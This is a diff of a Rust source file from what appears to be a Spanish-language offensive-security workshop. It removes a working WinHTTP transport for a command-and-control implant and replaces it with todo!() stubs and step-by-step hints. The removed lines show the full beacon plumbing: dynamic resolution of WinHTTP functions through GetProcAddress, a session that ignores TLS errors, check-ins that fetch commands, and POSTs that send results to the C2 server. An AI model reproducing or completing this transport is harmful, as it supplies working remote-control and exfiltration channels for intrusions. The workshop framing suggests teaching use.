@@ -17,29 +17,34 @@ pub struct WinHttpConfig {
     pub custom_headers: Option<String>,
 }
 
+/// Parsea una URL HTTP y extrae componentes.
+///
+/// PASOS A IMPLEMENTAR:
+/// 1. Detectar esquema (http:// o https://)
+/// 2. Separar host:port del path
+/// 3. Si no hay puerto, usar 80 (http) o 443 (https)
+/// 4. Asegurar que el path empieza con '/'
 pub fn winhttp_from_url(url: &str, user_agent: Option<String>, proxy: Option<String>) -> Result<WinHttpConfig, TransportError> {
-    let (ssl, host, port, uri) = parse_http_url(url)?;
-
-    let (checkin_uri, result_uri) = if uri.ends_with("/mp/checkin") {
-        (uri.clone(), "/mp/result".to_string())
-    } else if uri.ends_with("/mp/result") {
-        ("/mp/checkin".to_string(), uri.clone())
-    } else if uri.ends_with("/register") {
-        ("/mp/checkin".to_string(), "/mp/result".to_string())
-    } else {
-        (uri.clone(), uri.clone())
-    };
-
-    Ok(WinHttpConfig {
-        host,
-        port,
-        checkin_uri,
-        result_uri,
-        ssl,
-        user_agent,
-        proxy,
-        custom_headers: None,
-    })
+    /*
+    ============================================================
+    WORKSHOP: Implementar parsing de URL
+    ============================================================
+    
+    Pasos:
+    1. let s = url.trim();
+    2. let (ssl, rest) = if starts with "https://" { (true, rest) }
+       else if starts with "http://" { (false, rest) }
+       else { return Err(InvalidConfig) }
+    3. Separar host_port y uri por el primer '/'
+    4. Parsear puerto si existe (buscar ':')
+    5. Construir WinHttpConfig con checkin_uri y result_uri
+    
+    Hint: Para el workshop, si uri termina en "/register":
+    - checkin_uri = "/mp/checkin"
+    - result_uri = "/mp/result"
+    ============================================================
+    */
+    todo!("Implementar winhttp_from_url")
 }
 
 fn parse_http_url(url: &str) -> Result<(bool, String, u16, String), TransportError> {
@@ -78,6 +83,12 @@ fn parse_http_url(url: &str) -> Result<(bool, String, u16, String), TransportErr
     Ok((ssl, host, port, uri))
 }
 
+/// Transporte HTTP usando WinHTTP API.
+///
+/// PASOS A IMPLEMENTAR:
+/// 1. Implementar connect(): obtener punteros a funciones de winhttp.dll
+/// 2. Implementar checkin(): hacer GET/POST al C2
+/// 3. Implementar send_result(): enviar datos al C2
 pub struct WinHttpTransport {
     cfg: WinHttpConfig,
     fns: Option<WinHttpFns>,
@@ -101,68 +112,35 @@ impl WinHttpTransport {
         v
     }
 
+    /// Obtiene punteros a funciones de winhttp.dll usando GetProcAddress.
+    ///
+    /// PASOS A IMPLEMENTAR:
+    /// 1. Obtener handle de winhttp.dll con GetModuleHandle
+    /// 2. Si no está cargado, usar LoadLibraryW de kernel32.dll
+    /// 3. Resolver: WinHttpOpen, WinHttpConnect, WinHttpOpenRequest,
+    ///    WinHttpSendRequest, WinHttpReceiveResponse, WinHttpQueryDataAvailable,
+    ///    WinHttpReadData, WinHttpCloseHandle, WinHttpSetOption
     fn ensure(&mut self) -> Result<WinHttpFns, TransportError> {
-        if self.fns.is_none() {
-            let mut h = GetModuleHandle(Some("winhttp.dll"));
-            if h.is_none() {
-                if let Some(hk) = GetModuleHandle(Some("kernel32.dll")) {
-                    type LoadLibraryWFn = extern "system" fn(*const u16) -> *mut c_void;
-                    if let Some(p) = GetProcAddress(hk, "LoadLibraryW") {
-                        let f: LoadLibraryWFn = p.cast_to_function();
-                        let dll = Self::wstr("winhttp.dll");
-                        let _ = (f)(dll.as_ptr());
-                        h = GetModuleHandle(Some("winhttp.dll"));
-                    }
-                }
-            }
-            let Some(h) = h else {
-                return Err(TransportError::Unimplemented);
-            };
-
-            let open: WinHttpOpenFn = GetProcAddress(h.clone(), "WinHttpOpen")
-                .ok_or_else(|| TransportError::Unimplemented)?
-                .cast_to_function();
-            let connect: WinHttpConnectFn = GetProcAddress(h.clone(), "WinHttpConnect")
-                .ok_or_else(|| TransportError::Unimplemented)?
-                .cast_to_function();
-            let open_request: WinHttpOpenRequestFn = GetProcAddress(h.clone(), "WinHttpOpenRequest")
-                .ok_or_else(|| TransportError::Unimplemented)?
-                .cast_to_function();
-            let send_request: WinHttpSendRequestFn = GetProcAddress(h.clone(), "WinHttpSendRequest")
-                .ok_or_else(|| TransportError::Unimplemented)?
-                .cast_to_function();
-            let receive_response: WinHttpReceiveResponseFn = GetProcAddress(h.clone(), "WinHttpReceiveResponse")
-                .ok_or_else(|| TransportError::Unimplemented)?
-                .cast_to_function();
-            let query_data_available: WinHttpQueryDataAvailableFn = GetProcAddress(h.clone(), "WinHttpQueryDataAvailable")
-                .ok_or_else(|| TransportError::Unimplemented)?
-                .cast_to_function();
-            let read_data: WinHttpReadDataFn = GetProcAddress(h.clone(), "WinHttpReadData")
-                .ok_or_else(|| TransportError::Unimplemented)?
-                .cast_to_function();
-            let close_handle: WinHttpCloseHandleFn = GetProcAddress(h.clone(), "WinHttpCloseHandle")
-                .ok_or_else(|| TransportError::Unimplemented)?
-                .cast_to_function();
-            let set_option: WinHttpSetOptionFn = GetProcAddress(h.clone(), "WinHttpSetOption")
-                .ok_or_else(|| TransportError::Unimplemented)?
-                .cast_to_function();
-
-            self.fns = Some(WinHttpFns {
-                open,
-                connect,
-                open_request,
-                send_request,
-                receive_response,
-                query_data_available,
-                read_data,
-                close_handle,
-                set_option,
-            });
-        }
-
-        Ok(self.fns.expect("WinHttpFns missing"))
+        /*
+        ============================================================
+        WORKSHOP: Implementar resolución de funciones WinHTTP
+        ============================================================
+        
+        Pasos:
+        1. if self.fns.is_some() { return Ok(self.fns.unwrap()) }
+        2. let h = GetModuleHandle(Some("winhttp.dll"))
+        3. Si es None, cargar con LoadLibraryW
+        4. Para cada función:
+           let f: FnType = GetProcAddress(h.clone(), "FunctionName")
+               .ok_or(TransportError::Unimplemented)?
+               .cast_to_function();
+        5. Guardar en self.fns y retornar
+        ============================================================
+        */
+        todo!("Implementar ensure() para resolver funciones WinHTTP")
     }
 
+    /// Abre una request HTTP.
     fn open_request(&mut self, verb: &str, path: &str) -> Result<HINTERNET, TransportError> {
         let functions = self.ensure()?;
         if self.h_connect.is_null() {
@@ -192,7 +170,6 @@ impl WinHttpTransport {
         }
 
         if self.cfg.ssl {
-            // ignore common TLS warnings for workshop simplicity
             let mut sec_flags: u32 = 0x0000_0100 | 0x0000_2000 | 0x0000_1000 | 0x0000_0200;
             let _ = (functions.set_option)(
                 h,
@@ -205,120 +182,64 @@ impl WinHttpTransport {
         Ok(h)
     }
 
+    /// Ejecuta una transacción HTTP completa.
     fn transact(&mut self, verb: &str, path: &str, data: Option<&[u8]>) -> Result<Vec<u8>, TransportError> {
-        let f = self.ensure()?;
-        let h = self.open_request(verb, path)?;
-
-        let (opt_ptr, opt_len, total) = if let Some(d) = data {
-            (d.as_ptr() as *mut c_void, d.len() as u32, d.len() as u32)
-        } else {
-            (core::ptr::null_mut(), 0u32, 0u32)
-        };
-
-        let (hdr_ptr, hdr_len) = if let Some(hs) = self.cfg.custom_headers.as_ref() {
-            let w = Self::wstr(hs);
-            (w.as_ptr() as *const u16, 0xFFFF_FFFFu32)
-        } else {
-            (core::ptr::null(), 0u32)
-        };
-
-        let ok = (f.send_request)(h, hdr_ptr, hdr_len, opt_ptr, opt_len, total, 0);
-        if ok == 0 {
-            let _ = (f.close_handle)(h);
-            return Err(TransportError::Io("send_request".into()));
-        }
-
-        let ok2 = (f.receive_response)(h, core::ptr::null_mut());
-        if ok2 == 0 {
-            let _ = (f.close_handle)(h);
-            return Err(TransportError::Io("recv_resp".into()));
-        }
-
-        let mut out = Vec::new();
-        loop {
-            let mut avail: u32 = 0;
-            let ok3 = (f.query_data_available)(h, &mut avail as *mut u32);
-            if ok3 == 0 || avail == 0 {
-                break;
-            }
-
-            let mut buf = vec![0u8; avail as usize];
-            let mut read: u32 = 0;
-            let ok4 = (f.read_data)(
-                h,
-                buf.as_mut_ptr() as *mut c_void,
-                avail,
-                &mut read as *mut u32,
-            );
-            if ok4 == 0 || read == 0 {
-                break;
-            }
-            buf.truncate(read as usize);
-            out.extend_from_slice(&buf);
-        }
-
-        #[cfg(debug_assertions)]
-        {
-            let in_len = data.map(|d| d.len()).unwrap_or(0);
-            eprintln!("winhttp {} {} in={} out={}", verb, path, in_len, out.len());
-        }
-
-        let _ = (f.close_handle)(h);
-        Ok(out)
+        /*
+        ============================================================
+        WORKSHOP: Implementar transacción HTTP
+        ============================================================
+        
+        Pasos:
+        1. let h = self.open_request(verb, path)?
+        2. Preparar datos (si hay) y headers
+        3. Llamar WinHttpSendRequest
+        4. Llamar WinHttpReceiveResponse
+        5. Loop: WinHttpQueryDataAvailable + WinHttpReadData
+        6. Cerrar handle con WinHttpCloseHandle
+        7. Retornar datos recibidos
+        ============================================================
+        */
+        todo!("Implementar transact()")
     }
 }
 
+/// Implementa el trait Transport para WinHttpTransport.
+///
+/// PASOS A IMPLEMENTAR:
+/// 1. connect(): crear sesión y conexión con WinHttpOpen + WinHttpConnect
+/// 2. checkin(): GET o POST al checkin_uri según si hay datos
+/// 3. send_result(): POST al result_uri
 impl Transport for WinHttpTransport {
     fn type_name(&self) -> &'static str {
         "winhttp"
     }
 
+    /// Conecta al servidor C2.
+    ///
+    /// PASOS A IMPLEMENTAR:
+    /// 1. Verificar si ya está conectado (h_session y h_connect no null)
+    /// 2. Llamar WinHttpOpen con user_agent
+    /// 3. Llamar WinHttpConnect con host y port
+    /// 4. Guardar handles en self.h_session y self.h_connect
     fn connect(&mut self) -> Result<(), TransportError> {
-        let f = self.ensure()?;
-        if !self.h_session.is_null() && !self.h_connect.is_null() {
-            return Ok(());
-        }
-
-        let ua = self
-            .cfg
-            .user_agent
-            .clone()
-            .unwrap_or_else(|| "workshop-agent".to_string());
-        let ua_w = Self::wstr(&ua);
-
-        let (access, proxy_ptr) = if let Some(px) = self.cfg.proxy.as_ref() {
-            (3u32, Self::wstr(px))
-        } else {
-            (0u32, vec![0u16])
-        };
-
-        let h_session = (f.open)(
-            ua_w.as_ptr(),
-            access,
-            if proxy_ptr.len() > 1 {
-                proxy_ptr.as_ptr()
-            } else {
-                core::ptr::null()
-            },
-            core::ptr::null(),
-            0,
-        );
-        if h_session.is_null() {
-            return Err(TransportError::Io("open".into()));
-        }
-
-        let host_w = Self::wstr(&self.cfg.host);
-        let h_connect = (f.connect)(h_session, host_w.as_ptr(), self.cfg.port, 0);
-        if h_connect.is_null() {
-            let _ = (f.close_handle)(h_session);
-            return Err(TransportError::Io("connect".into()));
-        }
-
-        self.h_session = h_session;
-        self.h_connect = h_connect;
-        Ok(())
+        /*
+        ============================================================
+        WORKSHOP: Implementar conexión WinHTTP
+        ============================================================
+        
+        Pasos:
+        1. if !self.h_session.is_null() && !self.h_connect.is_null() { return Ok(()) }
+        2. let f = self.ensure()?;
+        3. let ua_w = Self::wstr(&user_agent);
+        4. let h_session = (f.open)(ua_w.as_ptr(), access, proxy_ptr, null, 0);
+        5. let h_connect = (f.connect)(h_session, host_w.as_ptr(), port, 0);
+        6. self.h_session = h_session; self.h_connect = h_connect;
+        ============================================================
+        */
+        todo!("Implementar connect()")
     }
 
+    /// Envía checkin y recibe comandos.
     fn checkin(&mut self, request: &[u8]) -> Result<Vec<u8>, TransportError> {
         if self.h_connect.is_null() {
             self.connect()?;
@@ -329,20 +250,13 @@ impl Transport for WinHttpTransport {
         } else {
             self.transact("POST", &checkin_uri, Some(request))?
         };
-        #[cfg(debug_assertions)]
-        {
-            eprintln!("checkin bytes={}", out.len());
-        }
         Ok(out)
     }
 
+    /// Envía resultados al C2.
     fn send_result(&mut self, data: &[u8]) -> Result<(), TransportError> {
         if self.h_connect.is_null() {
             self.connect()?;
-        }
-        #[cfg(debug_assertions)]
-        {
-            eprintln!("send_result bytes={}", data.len());
         }
         let result_uri = self.cfg.result_uri.clone();
         let _ = self.transact("POST", &result_uri, Some(data))?;
